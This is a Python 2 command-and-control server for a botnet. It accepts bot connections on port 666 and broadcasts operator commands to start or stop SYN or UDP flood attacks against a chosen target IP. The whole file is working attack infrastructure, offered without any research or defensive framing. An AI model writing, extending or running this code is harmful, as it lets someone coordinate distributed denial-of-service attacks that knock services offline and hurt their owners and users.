# -*- coding: utf-8 -*- 

# This will be the command server, talking to our bots (attackers)
import sys
import thread
import socket

# List of connected bots
bots = []

PORT = 666
HOST = socket.gethostbyname(socket.gethostname())
#HOST = '127.0.0.1'

# Read input from terminal, and send commands to the bots
def readCommands():
	print 'Command: <start or stop> <syn or udp> <targetIP>'
	while True:
		try:
			inString = raw_input('>>')
		except Exception as e:
			print 'INPUT ERROR!'
		
		NumberofFields = inString.count(' ') + 1

		if NumberofFields == 3:
			command, atkType, victim = inString.split(' ')
			print 'Command: ' + command
			print 'Attack: ' + atkType
			print 'Target: ' + victim
		elif NumberofFields == 2:
			command, victim = inString.split(' ')
			print 'Command: ' + command
			print 'Target: ' + victim

		if command == 'start':
			for bot in bots:
				bot.send('START' + '/' + atkType + '/' + victim)
		elif command == 'stop':
			for bot in bots:
				bot.send('STOP' + '/' + victim)

#Host a server, listening for bots to make a connection
if __name__=='__main__':
	#Server
	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	serversocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
	serversocket.bind((HOST, PORT))
	serversocket.listen(999)

	thread.start_new_thread(readCommands, ())

	while 1:
	    botsock, addr = serversocket.accept()
	    bots.append(botsock)